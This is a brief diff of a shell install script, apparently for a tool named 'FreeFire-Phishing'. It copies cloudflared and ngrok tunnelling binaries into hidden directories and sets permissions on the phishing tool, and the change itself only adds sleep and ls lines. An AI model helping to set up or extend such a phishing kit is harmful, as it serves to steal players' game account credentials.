@@ -314,6 +314,9 @@ cp -R cloudflared ngrok .SUMAN/8/
 cp -R cloudflared ngrok .SUMAN/9/
 cp -R cloudflared ngrok .SUMAN/0/
 chmod 7777 FreeFire-Phishing
+sleep 5
+ls
+sleep 5
 clear
 echo
 uninstall
